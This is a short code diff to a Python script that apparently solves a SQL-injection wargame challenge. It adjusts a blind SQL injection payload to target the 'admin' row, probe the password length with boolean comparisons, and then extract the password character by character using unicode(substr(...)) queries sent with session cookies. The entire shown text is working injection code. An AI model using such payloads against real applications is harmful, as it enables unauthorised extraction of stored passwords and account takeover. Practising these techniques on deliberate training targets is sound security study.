@@ -30,9 +30,10 @@ def main():
     cook = lc.check_cookies(url)
     method = 'get'
     inj_param = 'pw'
+    other_param = {'id': 'admin'}
 
-    payload = "' or length(pw)>%s-- "
-    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    payload = "' or id='admin' and length(pw)<%s-- "
+    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
     len_of_key = p.find_key_len(check_func)
 
     p.payload = f"' or unicode(substr(pw,%d,1))<%s-- "
